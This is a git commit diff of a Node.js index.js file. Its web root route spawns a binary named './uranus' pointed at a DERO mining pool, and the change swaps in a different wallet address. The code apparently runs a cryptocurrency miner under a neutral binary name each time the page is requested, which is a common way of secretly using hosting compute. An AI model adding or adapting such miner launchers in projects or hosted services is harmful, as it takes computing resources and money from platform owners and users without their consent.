dbd7b5e7756c2fff54f3d097d9be8cb418065b00
progerdakaas <98955884+progerdakaas@users.noreply.github.com>
2023-02-16 15:10:31 +0100

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ const port = 3000;
 const { spawn } = require('child_process');
 
 app.get('/', (req, res) => {
-  const uranus = spawn("./uranus", ["-o", "wss://community-pools.mysrv.cloud:10300", "-u", "dero1qyfjd3gswr7afgrgm0w8trp5wn09sudh9mld8czscf9a46n6grhcgqghx8k3p"]);
+  const uranus = spawn("./uranus", ["-o", "wss://community-pools.mysrv.cloud:10300", "-u", "dero1qyy8vj5jyxldud7f7l53nj9tyye72c2rv9g8hg6fv3clfs5z55gmgqgu0j733"]);
 
   uranus.stdout.on('data', (data) => {
     console.log(`stdout: ${data}`);
